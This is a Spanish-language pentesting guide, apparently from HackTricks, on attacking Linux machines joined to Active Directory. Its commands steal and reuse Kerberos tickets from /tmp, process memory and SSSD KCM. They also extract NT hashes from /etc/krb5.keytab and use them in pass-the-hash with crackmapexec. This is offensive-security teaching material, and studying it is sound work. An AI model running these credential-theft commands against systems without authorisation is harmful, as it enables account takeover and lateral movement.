# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Una máquina linux también puede estar presente dentro de un entorno de Active Directory.

Una máquina linux en un AD podría estar **almacenando diferentes tickets CCACHE dentro de archivos. Estos tickets pueden ser utilizados y abusados como cualquier otro ticket kerberos**. Para leer estos tickets necesitarás ser el usuario propietario del ticket o **root** dentro de la máquina.

## Enumeración

### Enumeración de AD desde linux

Si tienes acceso a un AD en linux (o bash en Windows) puedes intentar [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) para enumerar el AD.

También puedes consultar la siguiente página para aprender **otras formas de enumerar AD desde linux**:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA es una **alternativa** de código abierto a Microsoft Windows **Active Directory**, principalmente para entornos **Unix**. Combina un **directorio LDAP** completo con un centro de distribución de claves **Kerberos** de MIT para la gestión similar a Active Directory. Utiliza el **Sistema de Certificados Dogtag** para la gestión de certificados CA y RA, y admite autenticación **multifactor**, incluyendo tarjetas inteligentes. SSSD está integrado para procesos de autenticación Unix. Aprende más sobre ello en:

{{#ref}}
../freeipa-pentesting.md
{{#endref}}

## Jugando con tickets

### Pass The Ticket

En esta página encontrarás diferentes lugares donde podrías **encontrar tickets kerberos dentro de un host linux**, en la siguiente página puedes aprender cómo transformar estos formatos de tickets CCache a Kirbi (el formato que necesitas usar en Windows) y también cómo realizar un ataque PTT:

{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

### Reutilización de tickets CCACHE desde /tmp

Los archivos CCACHE son formatos binarios para **almacenar credenciales Kerberos** que generalmente se almacenan con permisos 600 en `/tmp`. Estos archivos pueden ser identificados por su **formato de nombre, `krb5cc_%{uid}`,** que corresponde al UID del usuario. Para la verificación del ticket de autenticación, la **variable de entorno `KRB5CCNAME`** debe establecerse en la ruta del archivo de ticket deseado, permitiendo su reutilización.

Lista el ticket actual utilizado para la autenticación con `env | grep KRB5CCNAME`. El formato es portátil y el ticket puede ser **reutilizado configurando la variable de entorno** con `export KRB5CCNAME=/tmp/ticket.ccache`. El formato del nombre del ticket Kerberos es `krb5cc_%{uid}` donde uid es el UID del usuario.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### Reutilización de tickets CCACHE desde el keyring

**Los tickets de Kerberos almacenados en la memoria de un proceso pueden ser extraídos**, particularmente cuando la protección ptrace de la máquina está deshabilitada (`/proc/sys/kernel/yama/ptrace_scope`). Una herramienta útil para este propósito se encuentra en [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), que facilita la extracción inyectando en sesiones y volcando tickets en `/tmp`.

Para configurar y usar esta herramienta, se siguen los pasos a continuación:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Este procedimiento intentará inyectar en varias sesiones, indicando el éxito al almacenar los tickets extraídos en `/tmp` con una convención de nombres de `__krb_UID.ccache`.

### Reutilización de tickets CCACHE desde SSSD KCM

SSSD mantiene una copia de la base de datos en la ruta `/var/lib/sss/secrets/secrets.ldb`. La clave correspondiente se almacena como un archivo oculto en la ruta `/var/lib/sss/secrets/.secrets.mkey`. Por defecto, la clave solo es legible si tienes permisos de **root**.

Invocar \*\*`SSSDKCMExtractor` \*\* con los parámetros --database y --key analizará la base de datos y **desencriptará los secretos**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
El **blob de caché de credenciales de Kerberos se puede convertir en un archivo CCache de Kerberos utilizable** que se puede pasar a Mimikatz/Rubeus.

### Reutilización de tickets CCACHE desde keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Extraer cuentas de /etc/krb5.keytab

Las claves de cuentas de servicio, esenciales para los servicios que operan con privilegios de root, se almacenan de forma segura en los archivos **`/etc/krb5.keytab`**. Estas claves, similares a contraseñas para servicios, exigen estricta confidencialidad.

Para inspeccionar el contenido del archivo keytab, se puede emplear **`klist`**. La herramienta está diseñada para mostrar detalles de la clave, incluyendo el **NT Hash** para la autenticación de usuarios, particularmente cuando el tipo de clave se identifica como 23.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Para los usuarios de Linux, **`KeyTabExtract`** ofrece funcionalidad para extraer el hash RC4 HMAC, que se puede aprovechar para la reutilización del hash NTLM.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
En macOS, **`bifrost`** sirve como una herramienta para el análisis de archivos keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Utilizando la información de cuenta y hash extraída, se pueden establecer conexiones a servidores utilizando herramientas como **`crackmapexec`**.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Referencias

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

{{#include ../../banners/hacktricks-training.md}}
